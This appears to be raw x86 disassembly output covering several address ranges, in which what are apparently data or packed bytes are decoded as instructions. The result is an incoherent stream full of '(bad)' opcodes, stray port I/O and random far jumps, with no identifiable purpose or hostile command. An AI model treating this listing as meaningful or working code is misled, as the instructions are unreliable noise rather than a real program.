  42063b:	mov    ebp,DWORD PTR [edi+0x76d00e63]
	...
  4206b1:	add    BYTE PTR [eax],al
  4206b3:	add    BYTE PTR [edx-0x5081dcc4],dl
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	(bad)  
  4206c1:	lods   al,BYTE PTR ds:[esi]
  4206c2:	jae    0x4206a9
  4206c4:	mov    esi,0xf600015b
  4206c9:	add    BYTE PTR [eax],al
  4206cb:	add    BYTE PTR [edi-0x2e11da96],bh
  4206d1:	in     eax,dx
  4206d2:	inc    ebx
  4206d3:	in     eax,0x4a
  4206d5:	(bad)
  4206d8:	and    edi,DWORD PTR [ebp+0x3d37d283]
  4206de:	div    ch
  4206e0:	jne    0x4206a4
  4206e2:	add    DWORD PTR [ecx-0x451f3f9c],edi
  4206e8:	dec    ebx
  4206e9:	pop    ds
  4206ea:	push   ss
  4206eb:	inc    esp
  4206ec:	and    eax,DWORD PTR [eax-0x21]
  4206ef:	or     al,0xd2
  4206f1:	cmp    al,0x4
  4206f3:	lods   eax,DWORD PTR ds:[esi]
  4206f4:	pop    esi
  4206f5:	push   cs
  4206f6:	js     0x420725
  4206f8:	and    al,0x2b
  4206fa:	xchg   esi,eax
  4206fb:	test   al,0x2f
  4206fd:	clc    
  4206fe:	ffreep st(6)
  420700:	dec    esp
  420701:	and    al,BYTE PTR [eax]
  420703:	mov    ds:0x6cc03b59,al
  420708:	add    edi,DWORD PTR [edi+0x7357777a]
  42070e:	sub    BYTE PTR [edx+eiz*1+0x40],al
  420712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420713:	inc    esp
  420714:	xlat   BYTE PTR ds:[ebx]
  420715:	adc    edx,DWORD PTR [edx*1+0x4d7101ac]
  42071c:	pop    eax
  42071d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42071e:	jl     0x420776
  420720:	rcr    ah,1
  420722:	sahf   
  420723:	adc    dh,BYTE PTR ds:0x58b90415
  420729:	pop    ss
  42072a:	add    BYTE PTR [eax],0x24
  42072d:	mov    ch,0x6
  42072f:	pop    ecx
  420730:	ror    BYTE PTR [ecx],1
  420732:	stc    
  420733:	neg    cl
  420735:	add    al,0xe8
  420737:	adc    ah,BYTE PTR [ebx]
  420739:	xchg   ebp,eax
  42073a:	icebp  
  42073b:	ds sbb eax,0x6beb72bd
  420741:	(bad)  
  420742:	inc    BYTE PTR [esi]
  420744:	cmp    BYTE PTR [esi+0x5b],ch
  420747:	int    0x6f
  420749:	add    ah,al
  42074b:	mov    ss,WORD PTR [eax]
  42074d:	outs   dx,DWORD PTR ds:[esi]
  42074e:	jmp    0xb76c740c
  420753:	ret    
  420754:	or     al,0x74
  420756:	es dec edx
  420758:	out    dx,al
  420759:	enter  0x910b,0x76
  42075d:	neg    BYTE PTR [ecx-0xe66a5ef]
  420763:	repnz add ch,BYTE PTR [ebp+0x7d]
  420767:	ss sub al,0x72
  42076a:	push   edx
  42076b:	cmp    eax,ebp
  42076d:	xchg   BYTE PTR [esi-0x6ea3973f],al
  420773:	push   eax
  420774:	aad    0x97
  420776:	xor    eax,0x1aa053c6
  42077b:	cmp    al,0xc7
  42077d:	std    
  42077e:	jecxz  0x42077e
  420780:	icebp  
  420781:	gs push ss
  420783:	(bad)  
  420784:	in     al,0x36
  420786:	pusha  
  420787:	adc    DWORD PTR [edx-0x3f],0xfffffffb
  42078b:	imul   edi,DWORD PTR [ebx+0x5fd4f046],0xf8e660fa
  420795:	enter  0x68d4,0x29
  420799:	mov    esi,0x60fb394
  42079e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42079f:	lea    esp,[ebx+0x25ad8a3b]
  4207a5:	pop    ecx
  4207a6:	dec    ebp
  4207a7:	inc    edi
  4207a8:	mov    ecx,0x76c90774
  4207ad:	retf   0x4505
  4207b0:	dec    edx
  4207b1:	mov    dh,0x21
  4207b3:	pop    edx
  4207b4:	lods   al,BYTE PTR ds:[esi]
  4207b5:	jl     0x420751
  4207b7:	inc    ebp
  4207b8:	xor    eax,0xff5d041c
  4207bd:	and    BYTE PTR [ecx+0x2b],bh
  4207c0:	pop    DWORD PTR [edi+0x0]
	...
  420833:	add    BYTE PTR [ecx+0x3b920b9a],ah
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x24
  420841:	mov    edx,0x5cb44f71
  420846:	add    DWORD PTR [eax],eax
  420848:	test   BYTE PTR [eax],0x0
  42084b:	add    BYTE PTR [eax+0x68e3df51],bl
  420851:	aam    0xcb
  420853:	data16 shr BYTE PTR [edi*2+0x1d3f02a2],0xaa
  42085c:	mov    ebp,0x221ad4c5
  420861:	cdq    
  420862:	dec    esp
  420863:	sub    DWORD PTR [edx],esp
  420865:	out    0x1a,al
  420867:	scas   al,BYTE PTR es:[edi]
  420868:	push   cs
  420869:	aas    
  42086a:	jg     0x420847
  42086c:	adc    ebp,DWORD PTR [edx+ecx*2+0x54cabbc6]
  420873:	fwait
  420874:	push   ds
  420875:	add    DWORD PTR es:[edi],ebp
  420878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420879:	jo     0x4208cb
  42087b:	sub    esi,DWORD PTR [eax]
  42087d:	stos   BYTE PTR es:[edi],al
  42087e:	mov    al,0x4f
  420880:	and    eax,0xe69597c4
  420885:	or     ch,BYTE PTR [ebx-0x28421157]
  42088b:	dec    ebp
  42088c:	addr16 iret 
  42088e:	pop    eax
  42088f:	xor    BYTE PTR [ebp-0x50],0x1e
  420893:	aaa    
  420894:	enter  0x342,0xa0
  420898:	mov    esi,0xd9afb8f3
  42089d:	sub    DWORD PTR [eax],ecx
  42089f:	pop    eax
  4208a0:	into   
  4208a1:	add    al,0x2
  4208a3:	mov    esp,0x31f88b48
  4208a8:	jp     0x420894
  4208aa:	sti    
  4208ab:	cs int 0xdb
  4208ae:	xor    ebp,edx
  4208b0:	push   ds
  4208b1:	push   ecx
  4208b2:	hlt    
  4208b3:	nop
  4208b4:	imul   ebp,DWORD PTR [edi+edi*1],0xffffffac
  4208b8:	add    BYTE PTR [edx+ecx*1-0x22],0xcf
  4208bd:	mov    al,ds:0x9af6fc24
  4208c2:	cmp    ah,BYTE PTR [ebp-0x954563f]
  4208c8:	add    edi,edi
  4208ca:	xor    edi,DWORD PTR cs:[edi+0x3503a015]
  4208d1:	or     ah,BYTE PTR [ebp-0x44376684]
  4208d7:	dec    esi
  4208d8:	std    
  4208d9:	pop    esp
  4208da:	push   ss
  4208db:	pop    edi
  4208dc:	sub    DWORD PTR [ebp-0x3d],ebx
  4208df:	scas   eax,DWORD PTR es:[edi]
  4208e0:	lods   eax,DWORD PTR ds:[esi]
  4208e1:	push   ebx
  4208e2:	adc    eax,0x9b4d5a3d
  4208e7:	(bad)  
  4208e8:	ror    DWORD PTR [ecx-0x7006f92a],cl
  4208ee:	aaa    
  4208ef:	enter  0x46c1,0xef
  4208f3:	cmp    edx,DWORD PTR [edx+edi*2-0x7b5c690a]
  4208fa:	adc    al,0xea
  4208fc:	loopne 0x4208a1
  4208fe:	ret    0x7b4b
  420901:	or     eax,0xc33c87c6
  420906:	pop    eax
  420907:	add    BYTE PTR fs:[edx-0x537cd8f2],ch
  42090e:	in     al,dx
  42090f:	sub    DWORD PTR [edi+edi*8-0x3604ce73],0xc21a08c
  42091a:	fcomp  DWORD PTR [ecx]
  42091c:	(bad)  
  42091d:	loop   0x42092a
  42091f:	ror    BYTE PTR [edx-0x785cebd0],cl
  420925:	add    BYTE PTR [edx],al
  420927:	bound  ecx,QWORD PTR [edx]
  420929:	ret    
  42092a:	not    DWORD PTR [edi+0x1f]
  42092d:	fdiv   DWORD PTR [ebx+0x5e]
  420930:	sub    BYTE PTR [eax],cl
  420932:	lods   al,BYTE PTR ds:[esi]
  420933:	inc    esp
  420934:	fst    QWORD PTR [ebx+0x2f]
  420937:	ret    0xc445
  42093a:	mov    DWORD PTR [ebp-0x58111ef4],edi
  420940:	add    al,0x78
	...
  4209b2:	add    BYTE PTR [eax],al
  4209b4:	or     al,BYTE PTR [ecx-0x49]
  4209b7:	mov    eax,ds:0xeb1ef7ff
  4209bc:	rcr    BYTE PTR [esi+0x772b66de],0x22
  4209c3:	fild   QWORD PTR [edx-0x9fffea3]
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    BYTE PTR [ebx-0x3f51527f],ah
  4209d1:	shl    DWORD PTR [esi-0x22c2365f],1
  4209d7:	push   cs
  4209d8:	ins    DWORD PTR es:[edi],dx
  4209d9:	add    DWORD PTR ds:0x6849fd02,ebx
  4209df:	fistp  DWORD PTR [edx-0x21]
  4209e2:	ja     0x420a55
  4209e4:	and    DWORD PTR [eax],0x4f
  4209e7:	sub    ah,BYTE PTR [eax]
  4209e9:	pop    edx
  4209ea:	or     BYTE PTR [edx-0x200bd306],al
  4209f0:	(bad)  
  4209f1:	cwde   
  4209f2:	ja     0x420990
  4209f4:	aaa    
  4209f5:	fs jbe 0x420a14
  4209f8:	scas   al,BYTE PTR es:[edi]
  4209f9:	mov    BYTE PTR [esi-0x17b15ade],ah
  4209ff:	mov    ch,0xae
  420a01:	ret    
  420a02:	inc    edx
  420a03:	in     al,dx
  420a04:	jmp    DWORD PTR [esi-0x2f808dbd]
  420a0a:	xchg   ebx,eax
  420a0b:	cmp    esp,DWORD PTR [ebx+0x6f20bc50]
  420a11:	fisubr DWORD PTR [ebp-0x34d12193]
  420a17:	push   0x403e48e9
  420a1c:	mov    bh,0x69
  420a1e:	mov    eax,ds:0x94eed3da
  420a23:	cwde   
  420a24:	aas    
  420a25:	jo     0x4209f3
  420a27:	dec    BYTE PTR [ebp+0x19]
  420a2a:	push   edi
  420a2b:	(bad)  
  420a2c:	popa   
  420a2d:	lds    edx,FWORD PTR [ecx]
  420a2f:	push   ss
  420a30:	call   0x295b0384
  420a35:	rcl    BYTE PTR es:[edx],1
  420a38:	or     DWORD PTR [eax+0x74],0x88cbb81f
  420a3f:	and    bl,bh
  420a41:	cmp    eax,0xfd979ec2
  420a46:	or     ah,BYTE PTR [edx+eax*8+0x6739383]
  420a4d:	or     ebp,DWORD PTR [ecx-0x53]
  420a50:	and    eax,0x3e09e720
  420a55:	outs   dx,BYTE PTR ds:[esi]
  420a56:	mov    edx,0xb055805
  420a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a5c:	js     0x420ac1
  420a5e:	jne    0x420a0b
  420a60:	cmovae edx,DWORD PTR [esi-0x5e]
  420a64:	ss or  edx,ecx
  420a67:	aam    0x14
  420a69:	inc    ecx
  420a6a:	repnz cs xchg ecx,eax
  420a6d:	dec    esi
  420a6e:	aaa    
  420a6f:	mov    ch,0x23
  420a71:	adc    ecx,DWORD PTR [edx-0x12]
  420a74:	ins    BYTE PTR es:[edi],dx
  420a75:	sbb    al,0x1
  420a77:	mov    ebx,0x4c0fa13b
  420a7c:	adc    dl,BYTE PTR [esi]
  420a7e:	xchg   ebp,eax
  420a7f:	mov    edx,0xc06a0a11
  420a84:	xor    BYTE PTR ds:0x6c5df33f,ah
  420a8a:	bound  esi,QWORD PTR [ebp+0x3c694f5a]
  420a90:	mov    esi,0xe674909
  420a95:	not    BYTE PTR [edi+0x79]
  420a98:	inc    edi
  420a99:	push   edx
  420a9a:	mov    al,ds:0x473ee76f
  420a9f:	stos   DWORD PTR es:[edi],eax
  420aa0:	jp     0x420a58
  420aa2:	mov    ah,0x24
  420aa4:	jne    0x420a78
  420aa6:	ror    bh,0x93
  420aa9:	adc    eax,0x24628859
  420aae:	mov    ebp,0x758759d9
  420ab3:	xchg   ebp,eax
  420ab4:	mov    bl,0xe1
  420ab6:	fmul   QWORD PTR [ebx-0x182fcaa7]
  420abc:	mov    esp,0xcd984783
  420ac1:	xor    eax,0x0
	...
  420b32:	add    BYTE PTR [eax],al
  420b34:	fsubr  QWORD PTR [eax]
  420b36:	mov    ah,ah
  420b38:	(bad)  
  420b39:	out    0xfe,al
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	(bad)  
  420b41:	lods   al,BYTE PTR ds:[esi]
  420b42:	fs and eax,0x15ea0
  420b48:	test   BYTE PTR [eax],0x0
  420b4b:	add    BYTE PTR [edi+0x65843a68],ch
  420b51:	mov    esi,0x965ca064
  420b56:	imul   ecx,DWORD PTR [edx],0x7a
  420b59:	mov    eax,ds:0xfcb6033e
  420b5e:	xchg   edi,eax
  420b5f:	call   0xebeb9232
  420b64:	lds    esp,FWORD PTR [ecx+0x1b]
  420b67:	pop    esp
  420b68:	(bad)  
  420b69:	push   ss
  420b6a:	jg     0x420b54
  420b6c:	xchg   ebx,eax
  420b6d:	mov    ah,0xe
  420b6f:	mov    esp,0x9afada48
  420b74:	and    BYTE PTR [eax-0x13],ch
  420b77:	stos   DWORD PTR es:[edi],eax
  420b78:	xchg   DWORD PTR [ecx-0x4],ebx
  420b7b:	out    0xab,al
  420b7d:	sbb    eax,0xe6137f50
  420b82:	mov    dh,0xbb
  420b84:	cmp    DWORD PTR [ebx-0x5c6766c8],edx
  420b8a:	jmp    DWORD PTR [esp+eiz*4-0x3c]
  420b8e:	pop    es
  420b8f:	dec    ebx
  420b90:	(bad)  
  420b91:	adc    esi,ebx
  420b93:	jbe    0x420b47
  420b95:	xor    BYTE PTR [ebx],ah
  420b97:	int    0xf7
  420b99:	jb     0x420b81
  420b9b:	fbld   TBYTE PTR [esi+0x1f]
  420b9e:	into   
  420b9f:	mov    esi,0xb3065958
  420ba4:	hlt    
  420ba5:	outs   dx,BYTE PTR ds:[esi]
  420ba6:	pop    es
  420ba7:	push   ss
  420ba8:	jno    0x420be8
  420baa:	xchg   ebx,eax
  420bab:	pop    ss
  420bac:	cli    
  420bad:	and    DWORD PTR [ebp-0x484b5731],eax
  420bb3:	loop   0x420b75
  420bb5:	daa    
  420bb6:	and    al,0x56
  420bb8:	push   ebp
  420bb9:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  420bbb:	jae    0x420bfa
  420bbd:	inc    eax
  420bbe:	add    eax,ebp
  420bc0:	pop    ds
  420bc1:	stos   DWORD PTR es:[edi],eax
  420bc2:	mov    esi,0xfab4c3de
  420bc7:	mov    DWORD PTR [edx+0x43],ebp
  420bca:	xchg   edx,eax
  420bcb:	cmp    BYTE PTR [ecx-0xa0f566b],bl
  420bd1:	add    al,0x83
  420bd3:	adc    DWORD PTR [edi],0x8
  420bd6:	neg    BYTE PTR [edi+eiz*2-0x23]
  420bda:	jg     0x420c03
  420bdc:	rol    DWORD PTR [ebp+0x7c],1
  420bdf:	mov    esp,0xcfda0ae0
  420be4:	xchg   ebx,eax
  420be5:	add    al,0x6a
  420be7:	retf   
  420be8:	pushw  cs
  420bea:	cli    
  420beb:	dec    esi
  420bec:	cwde   
  420bed:	es jnp 0x420b98
  420bf0:	xchg   ebx,eax
  420bf1:	add    DWORD PTR ds:0x52a39b6d,eax
  420bf7:	gs push esp
  420bf9:	jo     0x420bc8
  420bfb:	adc    BYTE PTR [esi],bh
  420bfd:	sub    esp,DWORD PTR [esi+0x1]
  420c00:	test   BYTE PTR [ebx-0x60],bh
  420c03:	(bad)  
  420c04:	addr16 mov edx,0xa949e1d1
  420c0a:	xchg   DWORD PTR [ecx],esp
  420c0c:	mov    BYTE PTR [ebx-0x14],dl
  420c0f:	test   al,0xe6
  420c11:	jge    0x420be3
  420c13:	cmp    eax,0x3a65e5b9
  420c18:	xchg   ecx,eax
  420c1a:	rol    BYTE PTR [ebx-0x30],1
  420c1d:	jg     0x420bc6
  420c1f:	ret    
  420c20:	sar    BYTE PTR [ecx+0xdb957a5],0x81
  420c27:	hlt    
  420c28:	or     al,0x28
  420c2a:	push   eax
  420c2b:	push   eax
  420c2c:	xor    ecx,DWORD PTR [ebx+ebx*1-0x80]
  420c30:	fdivr  st(3),st
  420c32:	inc    ecx
  420c33:	dec    BYTE PTR [edi+0x7a]
  420c36:	dec    esi
  420c37:	xor    al,0x85
  420c39:	call   0x413db7b2
  420c3e:	push   es
  420c3f:	retf   
  420c40:	sub    DWORD PTR [ebx+0x0],edx
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x2e12d75f
  420cc3:	inc    ecx
  420cc4:	xchg   esi,eax
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	test   BYTE PTR [eax],0x0
  420ccb:	add    al,dh
  420ccd:	imul   esp,DWORD PTR [ebx],0x20
  420cd0:	add    ecx,DWORD PTR [ecx+esi*2]
  420cd3:	xlat   BYTE PTR ds:[ebx]
  420cd4:	(bad)  
  420cd5:	xchg   ebx,eax
  420cd6:	jbe    0x420cfb
  420cd8:	and    cl,BYTE PTR [esi]
  420cda:	ret    0x618b
  420cdd:	mov    dh,0x12
  420cdf:	imul   esi
  420ce1:	pop    eax
  420ce2:	xchg   DWORD PTR [ebx-0x32],ecx
  420ce5:	mov    BYTE PTR [esi],al
  420ce7:	push   cs
  420ce8:	sahf   
  420ce9:	inc    DWORD PTR [eax]
  420ceb:	in     eax,dx
  420cec:	xor    eax,DWORD PTR [ebx+0x27]
  420cef:	pop    ss
  420cf0:	or     al,0xc8
  420cf2:	inc    esp
  420cf3:	cwde   
  420cf4:	stc    
  420cf5:	gs sub al,0x72
  420cf8:	add    bl,BYTE PTR [ecx+0x1273ea17]
  420cfe:	adc    eax,0xbe01b43b
  420d03:	outs   dx,DWORD PTR ds:[esi]
  420d04:	adc    dl,BYTE PTR [esi+0x154287dd]
  420d0a:	dec    edi
  420d0b:	push   ebx
  420d0c:	mov    BYTE PTR [edx],ah
  420d0e:	pop    esi
  420d0f:	inc    edi
  420d10:	add    ah,al
  420d12:	push   esp
  420d13:	xchg   ebx,eax
  420d14:	xor    esi,DWORD PTR [ecx]
  420d16:	leave  
  420d17:	popf   
  420d18:	mov    edx,0xffe8c35a
  420d1d:	imul   esp,DWORD PTR [ebx+0x1529e4cd],0x8f407eb2
  420d27:	ret    0xc7e5
  420d2a:	pop    eax
  420d2b:	not    BYTE PTR [ebx-0x2a]
  420d2e:	jbe    0x420daa
  420d30:	enter  0x7e0d,0x4
  420d34:	jp     0x420da0
  420d36:	sub    ebx,DWORD PTR [ebx]
  420d38:	aaa    
  420d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d3a:	jne    0x420d6a
  420d3c:	mov    eax,0x1e00e664
  420d41:	mov    ah,0xf4
  420d43:	pop    edx
  420d44:	(bad)  
  420d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d46:	mov    bh,0x3f
  420d48:	out    dx,eax
  420d49:	mov    ds:0xfe9826fb,eax
  420d4e:	jmp    0x420d02
  420d50:	push   ebx
  420d51:	xor    eax,0x453047ec
  420d56:	mov    al,0x96
  420d58:	fwait
  420d59:	dec    edi
  420d5a:	aad    0x18
  420d5c:	mov    esp,0x960b30ef
  420d61:	imul   ebx,DWORD PTR [edx-0x7d],0x9973340f
  420d68:	pop    ebx
  420d69:	test   eax,0x8c4c726c
  420d6e:	dec    esi
  420d6f:	and    al,0xb5
  420d71:	push   ss
  420d72:	and    BYTE PTR [eax+ecx*1-0xa],ah
  420d76:	arpl   WORD PTR [ecx+0x1],cx
  420d79:	in     al,0xd7
  420d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d7c:	mov    ds:0xc9d76d46,al
  420d81:	push   ds
  420d82:	loop   0x420d6a
  420d84:	sahf   
  420d85:	sbb    BYTE PTR [edi],al
  420d87:	std    
  420d88:	xchg   esp,eax
  420d89:	(bad)  [ebx]
  420d8b:	test   BYTE PTR [ecx],bl
  420d8d:	dec    edi
  420d8e:	push   esi
  420d8f:	and    edi,esp
  420d91:	das    
  420d92:	out    0x14,eax
  420d94:	ss je  0x420e01
  420d97:	(bad)  
  420d98:	fcomip st,st(6)
  420d9a:	add    BYTE PTR [ebp-0x5],0xc4
  420d9e:	gs xchg edi,eax
  420da0:	aas    
  420da1:	mov    ecx,0x1905d775
  420da6:	push   ebp
  420da7:	stos   DWORD PTR es:[edi],eax
  420da8:	dec    edi
  420da9:	push   ebp
  420daa:	and    DWORD PTR [ebp+ebx*8-0x1a27dd78],esp
  420db1:	xchg   ebp,eax
  420db2:	bound  edx,QWORD PTR [esi+0x4d]
  420db5:	mov    ecx,edx
  420db7:	ins    BYTE PTR es:[edi],dx
  420db8:	adc    dh,BYTE PTR ss:[edx+ebx*1+0xe]
  420dbd:	pop    ds
  420dbe:	or     dl,BYTE PTR [edi+0xc9b7]
	...
  420e34:	stos   BYTE PTR es:[edi],al
  420e35:	push   ebp
  420e36:	call   0x645d:0xffefffe7
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	jns    0x420e18
  420e42:	test   al,0x5c
  420e44:	mov    WORD PTR [eax+0x1],fs
  420e47:	add    dh,dh
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    BYTE PTR [ebx],ch
  420e4d:	out    dx,eax
  420e4e:	mul    BYTE PTR [edi+0x3b9c3948]
  420e54:	inc    esp
  420e55:	inc    ebx
  420e56:	jno    0x420ded
  420e58:	jmp    0x4947:0x5248db8f
  420e5f:	push   eax
  420e60:	ror    DWORD PTR [eax],0x5d
  420e63:	dec    ecx
  420e64:	mov    DWORD PTR ds:0x73d37d38,esi
  420e6a:	inc    esi
  420e6b:	push   ecx
  420e6c:	jp     0x420e65
  420e6e:	sahf   
  420e6f:	cmc    
  420e70:	shr    ah,1
  420e72:	jne    0x420e22
  420e74:	adc    al,0x6e
  420e76:	xor    DWORD PTR [ebp+0x559130e],edi
  420e7c:	jge    0x420ec5
  420e7e:	inc    edx
  420e7f:	push   esp
  420e80:	dec    esi
  420e81:	adc    eax,0xeae1eb6b
  420e86:	dec    ebp
  420e87:	lahf   
  420e88:	repz hlt 
  420e8a:	test   al,0xe4
  420e8c:	dec    esp
  420e8d:	je     0x420e3b
  420e8f:	dec    eax
  420e90:	jge    0x420e40
  420e92:	mov    WORD PTR [eax],?
  420e94:	mov    eax,0xb881458
  420e99:	fnstsw WORD PTR [esi]
  420e9b:	add    dl,ch
  420e9d:	sbb    al,BYTE PTR [ebx+0x9]
  420ea0:	ins    DWORD PTR es:[edi],dx
  420ea1:	xchg   BYTE PTR [esi],ah
  420ea3:	enter  0x3632,0x96
  420ea7:	jg     0x420e8a
  420ea9:	inc    edx
  420eaa:	fild   DWORD PTR [eax+0x53]
  420ead:	test   al,0x63
  420eaf:	stc    
  420eb0:	repz jno 0x420e42
  420eb3:	mov    al,ds:0x94c012f4
  420eb8:	add    eax,esi
  420eba:	pop    ebp
  420ebb:	dec    esi
  420ebc:	xchg   ebp,eax
  420ebd:	jae    0x420ebc
  420ebf:	sub    al,BYTE PTR [edi+ebp*2]
  420ec2:	mov    BYTE PTR [ecx+0x39],ah
  420ec5:	lods   eax,DWORD PTR ds:[esi]
  420ec6:	jb     0x420e9d
  420ec8:	out    0xaf,eax
  420eca:	(bad)
  420ecd:	inc    esp
  420ece:	fwait
  420ecf:	cmp    al,0xe8
  420ed1:	mov    cl,0x91
  420ed3:	loopne 0x420f4a
  420ed5:	inc    ebp
  420ed6:	cli    
  420ed7:	mov    eax,0xdd18ab8f
  420edc:	push   ebp
  420edd:	icebp  
  420ede:	mov    eax,0x4dd7b677
  420ee3:	fwait
  420ee4:	mov    edx,0x42dc6ca9
  420ee9:	mov    esp,0x680b3e9f
  420eee:	add    cl,ch
  420ef0:	dec    esi
  420ef1:	loop   0x420f72
  420ef3:	rcr    dl,cl
  420ef5:	cmp    BYTE PTR [edi],bh
  420ef7:	arpl   WORD PTR [esi-0x7],si
  420efa:	jb     0x420eb8
  420efc:	xor    ah,BYTE PTR ds:0x7249e835
  420f02:	sar    ebx,1
  420f04:	mov    bh,0x54
  420f06:	aas    
  420f07:	rcl    DWORD PTR [edi+0x5a602d9b],1
  420f0d:	and    al,al
  420f0f:	push   ebx
  420f10:	and    al,0x3d
  420f12:	jae    0x420f0b
  420f14:	ja     0x420ee5
  420f16:	jnp    0x420ea0
  420f18:	rcl    DWORD PTR [ebp+0x1171c9b8],cl
  420f1e:	lds    ecx,FWORD PTR [edx+eiz*2-0x24564361]
  420f25:	mov    eax,ds:0xf7997dde
  420f2a:	push   es
  420f2b:	neg    BYTE PTR [esi+ebp*4]
  420f2e:	out    dx,eax
  420f2f:	jnp    0x420fa7
  420f31:	int    0x81
  420f33:	out    dx,al
  420f34:	das    
  420f35:	cwde   
  420f36:	dec    edi
  420f37:	push   eax
  420f38:	iret   
  420f39:	sar    DWORD PTR [ecx+edi*8-0x6d],0xf8
  420f3e:	fldcw  WORD PTR [ebp-0x7a]
  420f41:	mov    bl,0x0
	...
  420fb3:	add    BYTE PTR [edx-0x5b],ah
  420fb6:	jbe    0x421037
  420fb8:	idiv   edi
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0x72
  420fc1:	clc    
  420fc2:	jnp    0x420f79
  420fc4:	and    BYTE PTR [ecx+0x1],0x0
  420fc8:	test   BYTE PTR [eax],0x0
  420fcb:	add    BYTE PTR [ebx-0x7b97b9ac],al
  420fd1:	inc    edx
  420fd2:	cdq    
  420fd3:	(bad)  
  420fd4:	push   0x12
  420fd6:	das    
  420fd7:	(bad)  [edx+0x1a74351]
  420fdd:	(bad)  
  420fde:	or     dl,BYTE PTR [ecx]
  420fe0:	sar    ah,0x56
  420fe3:	mov    ss:0x296890ee,eax
  420fe9:	mov    edi,0x34f3c24a
  420fee:	jnp    0x421056
  420ff0:	jmp    0x421052
  420ff2:	fistp  DWORD PTR [ebx-0x78a52dc7]
  420ff8:	gs mov cl,0xd6
  420ffb:	in     eax,0x7e
  420ffd:	dec    ecx
  420ffe:	adc    BYTE PTR [ebp+0x45],ch
  421001:	inc    ecx
  421002:	ds push 0xffffffb1
  421005:	lock dec ecx
  421007:	or     esi,DWORD PTR [ecx]
  421009:	ret    0xa2a3
  42100c:	pop    ebx
  42100d:	stos   DWORD PTR es:[edi],eax
  42100e:	loop   0x421004
  421010:	add    esi,esp
  421012:	adc    ecx,eax
  421014:	(bad)  
  421015:	int3   
  421016:	cmc    
  421017:	mov    dl,0xb
  421019:	add    al,0x54
  42101b:	into   
  42101c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42101d:	(bad)  
  42101e:	in     eax,0x5f
  421020:	mov    ah,0x9f
  421022:	test   al,0xd2
  421024:	rcl    bh,1
  421026:	add    eax,0xb0083d8d
  42102b:	lea    ebx,[edx]
  42102d:	stos   BYTE PTR es:[edi],al
  42102e:	test   al,0xc0
  421030:	sub    al,dh
  421032:	test   DWORD PTR [esi+0x4dfb04c6],ebx
  421038:	jbe    0x4210b5
  42103a:	dec    ecx
  42103b:	dec    esi
  42103c:	push   edi
  42103d:	push   ecx
  42103e:	mov    ch,0xd0
  421040:	inc    ah
  421042:	jnp    0x420fe7
  421044:	and    eax,0x365e3ae9
  421049:	sub    eax,0xcb866e5
  42104e:	or     DWORD PTR [eax+0x24],esp
  421051:	inc    ecx
  421052:	or     al,0x80
  421054:	call   0xb797:0x940294c2
  42105b:	add    al,0x42
  42105d:	int    0x14
  42105f:	sub    dh,BYTE PTR [edi]
  421061:	aas    
  421062:	push   eax
  421063:	(bad)  
  421064:	or     DWORD PTR fs:[ecx-0x769075ca],0xffffffcf
  42106c:	mov    cl,0x65
  42106e:	dec    esp
  42106f:	sbb    ebp,DWORD PTR [ebx]
  421071:	inc    ebp
  421072:	cwde   
  421073:	jns    0x42107a
  421075:	es callw 0x460f
  42107a:	sub    eax,0xd2c1a4ba
  42107f:	dec    esp
  421080:	imul   esp,edi,0xffffffba
  421083:	(bad)  
  421084:	and    BYTE PTR [edx],bh
  421086:	lahf   
  421087:	fwait
  421088:	xchg   ecx,eax
  421089:	data16 aam 0x6c
  42108c:	cwde   
  42108d:	test   BYTE PTR [ebx-0x14],dl
  421090:	cmc    
  421091:	mov    ecx,DWORD PTR [ebp+0x63]
  421094:	ret    0x4298
  421097:	sub    eax,0x23b286da
  42109c:	pusha  
  42109d:	mov    dh,0xbc
  42109f:	jmp    0x3a7cd4dc
  4210a4:	push   ebx
  4210a5:	push   0xffffffd3
  4210a7:	loope  0x4210de
  4210a9:	push   ds
  4210aa:	retf   
  4210ab:	imul   ebp,DWORD PTR [edx-0x35],0xffffffd3
  4210af:	call   0xa15a:0xe3a
  4210b5:	adc    ah,BYTE PTR [ebx-0x487ff20c]
  4210bb:	or     al,0x48
  4210bd:	xchg   edx,eax
  4210be:	mov    al,0x75
  4210c0:	xchg   ebp,eax
  4210c1:	xor    BYTE PTR [eax],al
	...
  421133:	add    BYTE PTR [ebx-0x31],dh
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x421180
  421141:	xor    ebp,DWORD PTR [edx+ecx*1]
  421144:	js     0x4211a8
  421146:	add    DWORD PTR [eax],eax
  421148:	test   BYTE PTR [eax],0x0
  42114b:	add    dl,bh
  42114d:	cwde   
  42114e:	scas   al,BYTE PTR es:[edi]
  42114f:	popa   
  421150:	(bad)  
  421151:	aaa    
  421152:	cmp    esp,ebp
  421154:	cmc    
  421155:	inc    edx
  421156:	xchg   ecx,eax
  421157:	mov    ebx,0xbae86892
  42115c:	(bad)  
  42115d:	(bad)  
  42115e:	mov    bl,0x9a
  421160:	outs   dx,DWORD PTR ds:[esi]
  421161:	dec    ebp
